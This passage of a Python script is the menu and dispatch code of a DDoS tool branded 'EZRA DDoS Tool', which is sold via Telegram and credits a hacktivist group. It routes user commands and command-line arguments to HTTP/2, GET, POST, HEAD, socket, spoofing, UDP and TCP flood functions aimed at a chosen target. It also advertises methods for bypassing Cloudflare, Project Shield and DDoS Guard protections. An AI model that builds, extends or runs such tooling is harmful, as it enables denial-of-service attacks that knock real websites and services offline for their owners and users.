    stdout.write("             "+Fore.LIGHTYELLOW_EX        +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"AUTHOR    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Author: Ezra Katz                   "+Fore.LIGHTYELLOW_EX+"  ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX          +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"♥   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" #Israel♥ #wesupportisrael       "+Fore.LIGHTCYAN_EX+"            ║\n")
    stdout.write("             "+Fore.LIGHTMAGENTA_EX        +"╚═════════════════════════════════════════════════════╝\n")
    


def credit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mEzra Katz\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Special Thanks "+Fore.RED+": \x1b[38;2;0;255;189mOren Levi & IsraelHackvist[Israeli Elite Force (iEF)]\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Thanks to You "+Fore.RED+": \x1b[38;2;0;255;189mFor Purchasing this Tool!\n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
    stdout.write("\n")    
##############################################################################################
from colorama import Fore, Style, init
from sys import stdout

from colorama import Fore, Style, init
from sys import stdout

def layer7():
    init(autoreset=True)  # Automatically reset colors after each print
    clear()

    # Define terminal width for centering
    import shutil
    terminal_width = shutil.get_terminal_size().columns

    def center_text(text):
        """Centers text based on the terminal width."""
        return text.center(terminal_width)

    # Define header, divider, and footer
    header = (
        center_text(f"{Fore.LIGHTWHITE_EX}╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗") + "\n" +
        center_text(f"{Fore.LIGHTCYAN_EX}║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝") + "\n" +
        center_text(f"{Fore.LIGHTCYAN_EX}╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩") + "\n"
    )
    divider_length = 112  # Adjust to match the content width
    divider_length2 = 112
    divider = center_text(f"{Fore.LIGHTCYAN_EX}╔{'═' * divider_length}╗") + "\n"
    footer = center_text(f"{Fore.LIGHTCYAN_EX}╚{'═' * divider_length2}╝") + "\n"

    # Define menu items
    menu_items = [
        ("cfb", "Bypass Cloudflare Protection Mechanism for Target Website"),
        ("pxcfb", "Bypass Cloudflare Protection Using Proxy Servers for Anonymity"),
        ("cfreq", "Bypass Cloudflare's Under Attack Mode, CAPTCHA, and Bot Fight Mode (request-based)"),
        ("cfsoc", "Bypass Cloudflare's Under Attack Mode, CAPTCHA, and Bot Fight Mode (socket-based)"),
        ("pxsky", "Bypass Google Project Shield & Anti-DDoS Services (Vshield) & DDoS Guard Free with Proxy"),
        ("sky", "Execute Sky-based Attack Without Proxy for Stealthier Traffic"),
        ("http2", "Launch HTTP/2.0 Request Attack to Overwhelm Target Servers"),
       ("pxhttp2", "Perform HTTP/2.0 Request Attacks Using Proxy Servers for Anonymity and Evasion"),
        ("get", "Execute Get Request Attacks to Target Server Vulnerabilities"),
        ("post", "Perform Post Request Attacks to Deplete Server Resources"),
        ("head", "Launch Head Request Attacks to Profile Servers and Exhaust Resources"),
        ("pps", "Perform GET Requests Using HTTP/1.1 for Light and Fast Attacks"),
        ("spoof", "Conduct HTTP Spoofing Attacks Using Sockets to Mask the Originating IP Address"),
        ("pxspoof", "Perform HTTP Spoofing Attacks Using Proxy Servers for Greater Anonymity"),
        ("soc", "Execute Socket-based Attacks to Inject Traffic and Manipulate Server Behavior"),
        ("pxraw", "Perform Proxy Request Attacks to Mask Traffic and Avoid Detection"),
        ("pxsoc", "Conduct Proxy Socket Attacks to Inject Malicious Traffic Using Remote Servers"),
    ]

    # Write centered content to stdout
    stdout.write("\n" + header)
    stdout.write(divider)

    for command, description in menu_items:
        line = f"{Fore.LIGHTCYAN_EX}║ {Fore.MAGENTA}• {Fore.LIGHTWHITE_EX}{command:<7} {Fore.LIGHTCYAN_EX}| {Fore.LIGHTWHITE_EX}{description:<98} {Fore.LIGHTCYAN_EX}║"
        stdout.write(center_text(line) + "\n")

    stdout.write(footer)
    stdout.write("\n")

# Use a function to clear the terminal
def clear():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')




##############################################################################################
def layer4():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"udp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" UDP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tcp   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" TCP Attack                                "+Fore.LIGHTCYAN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
def tools():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ║ ║ ║║ ║║  ╚═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX    +" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" IP Address Lookup"+Fore.LIGHTCYAN_EX+"                     ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" DNS Lookup   "+Fore.LIGHTCYAN_EX+"                     ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup   "+Fore.LIGHTCYAN_EX+"               ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
    stdout.write("\n")
##############################################################################################
import sys
import time
import os
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# Define colors using colorama
yellow = Fore.YELLOW
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
cyan = Fore.CYAN
white = Fore.WHITE

# Helper function to print text with a color and delay
def print_with_delay(text, color=Fore.WHITE, delay=0.5):
    sys.stdout.write(color + text + '\r')  # '\r' returns the cursor to the start of the line
    sys.stdout.flush()
    time.sleep(delay)
import os
import sys
import time

 

# Mock functions for screen clearing and color printing (replace these with your actual implementations)
def clear_screen():
    sys.stdout.write("\033[2J\033[H")  # ANSI escape sequence to clear the screen
    sys.stdout.flush()

def print_with_delay(text, color):
    sys.stdout.write(f"\r{color}{text}\033[0m")  # Print on the same line
    sys.stdout.flush()
    time.sleep(0.3)

# Define color variables (replace with your actual color codes)
red = "\033[31m"
blue = "\033[34m"
white = "\033[37m"
cyan = "\033[36m"
green = "\033[32m"

# Function to set the console title
def set_console_title(title):
    os.system(f"title {title}")  # Sets the title for Windows CMD

# Title function for EZRA ASCII art
def tit():
    clear_screen()
    sys.stdout.write(blue + "                                 ███████╗███████╗██████╗  █████╗                          \n")
    sys.stdout.write(white + "                                 ██╔════╝╚══███╔╝██╔══██╗██╔══██╗                        \n")
    sys.stdout.write(blue + "                                 █████╗    ███╔╝ ██████╔╝███████║                        \n")
    sys.stdout.write(white + "                                 ██╔══╝   ███╔╝  ██╔══██╗██╔══██║                        \n")
    sys.stdout.write(blue + "                                 ███████╗███████╗██║  ██║██║  ██║                        \n")
    sys.stdout.write(white + "                                 ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                        \n")
    sys.stdout.write(cyan + "                                  Welcome to the EZRA DDoS Tool!                       \n\n")
    time.sleep(1)

# Function to animate a single line with color changes
def color_animation_line(text, colors):
    for color in colors:
        print_with_delay(text, color)
    time.sleep(0.9)

# Function to display the EZRA ASCII banner
def ezra_banner():
    sys.stdout.write(cyan + "                   ══╦═════════════════════════════════════════════════════════╦══\n")
    sys.stdout.write(cyan + "      ╔══════════════╩═════════════════════════════════════════════════════════╩══════════════╗\n")
    sys.stdout.write(cyan + "      ║ " + white + "                            Welcome To The EZRA DDoS!  " + cyan + "                               ║\n")
    sys.stdout.write(cyan + "      ║ " + white + "                         Type [help] to see the Commands " + cyan + "                             ║\n")
    sys.stdout.write(cyan + "      ║ " + white + "                        Contact Dev - Telegram @ezrakatz  " + cyan + "                            ║\n")
    sys.stdout.write(cyan + "      ╚═══════════════════════════════════════════════════════════════════════════════════════╝\n")
    time.sleep(1)

# Main function for the flow
def main():
    # Set the title of the command prompt
    set_console_title("EZRA DDoS Tool")

    # Step 1: Display the title and animate "Starting the tool..."
    tit()
    color_animation_line("Starting the tool...", [red, blue, white, blue, white, blue, green])

    # Step 2: Animate "Connecting to Server..."
    color_animation_line("Connecting to Server...", [blue, white, blue, white, blue, white, green])

    color_animation_line("Thanks for Purchasing the Tool!", [blue, white, yellow, green])

    # Step 3: Clear the screen completely and then display the EZRA ASCII art and banner
    clear_screen()
    tit()  # Display the title ASCII art
    ezra_banner()  # Display the EZRA banner




##############################################################################################

def command():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"EZRA"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls" or command == "clear":
        clear()
        main()
    elif command == "help" or command == "?":
        help()
    elif command == "credit":
        credit()        
    elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
        layer7()
    elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
        layer4()
    elif command == "tools" or command == "tool":
        tools()
    elif command == "exit":
        exit()
    elif command == "test":
        target, thread, t = get_info_l7()
        test1(target, thread, t)
        time.sleep(10)
    elif command == "http2" or command == "HTTP2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif command == "pxhttp2" or command == "PXHTTP2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif command == "cfb" or command == "CFB":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "pxcfb" or command == "PXCFB":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif command == "pps" or command == "PPS":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join() 
    elif command == "spoof" or command == "SPOOF":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join() 
    elif command == "pxspoof" or command == "PXSPOOF":
        target, thread, t = get_info_l7()
        #timer = threading.Thread(target=countdown, args=(t,))
        #timer.start()
        LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
        #timer.join()
        time.sleep(1000)
    elif command == "get" or command == "GET":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command == "post" or command == "POST":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif command == "head" or command == "HEAD":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif command == "pxraw" or command == "PXRAW":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command == "soc" or command == "SOC":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "pxsoc" or command == "PXSOC":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command == "cfreq" or command == "CFREQ":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "cfsoc" or command == "CFSOC":
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif command == "pxsky" or command == "PXSKY":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif command == "sky" or command == "SKY":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "udp" or command == "UDP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif command == "tcp" or command == "TCP":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
        

##############################################################################################     
    elif command == "subnet":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')                   
            
    elif command == "dns":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
            
    elif command == "geoip":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://prolazy.best/ip.php?ip={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n") 

##############################################################################################   

def func():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"sky        "+Fore.RED+": "+Fore.WHITE+"HTTPS Flood and bypass for CF NoSec, DDoS Guard Free and vShield\n")
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    
    #stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
    #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")

    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mTOOLS"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        "+Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      "+Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     "+Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")
    
    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")




if __name__ == '__main__':
    init(convert=True)
    if len(sys.argv) < 2:
        ua = open('./resources/ua.txt', 'r').read().split('\n')
        clear()
        main()
        while True:
            command()
    elif len(sys.argv) == 5:
        pass
    else:
        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
        sys.exit()
    ua = open('./resources/ua.txt', 'r').read().split('\n')
    method = sys.argv[1].rstrip()
    target = sys.argv[2].rstrip()
    thread = sys.argv[3].rstrip()
    t      = sys.argv[4].rstrip()
    if method == "cfb":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif method == "pxcfb":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif method == "get":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif method == "post":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "head":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "pxraw":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "soc":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif method == "pxsoc":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif method == "cfreq":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "cfsoc":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif method == "http2":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif method == "pxhttp2":
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif method == "pxsky":
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif method == "sky":
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    else:
        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")